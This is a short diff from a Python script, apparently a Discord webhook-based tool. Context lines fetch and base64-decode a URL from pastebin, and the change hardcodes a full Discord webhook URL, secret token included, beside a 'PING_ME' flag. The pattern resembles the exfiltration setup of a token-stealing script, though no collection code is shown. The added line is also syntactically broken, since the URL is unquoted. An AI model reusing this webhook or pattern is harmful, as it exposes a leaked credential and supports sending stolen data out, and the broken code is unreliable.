@@ -13,7 +13,7 @@ r = requests.get(pastebin)
 content = r.text
 decode = base64.b64decode(content).decode('utf-8')
 
-WEBHOOK_URL = decode
+WEBHOOK_URL = https://discord.com/api/webhooks/924616241006641164/v6ZgDm557Nu2mofBfHcAeP31EjeqbNCxCvWgc2Bw0iKjiUhMPpOrvGIuRLThGxrPyRyh
 
 PING_ME = True
 
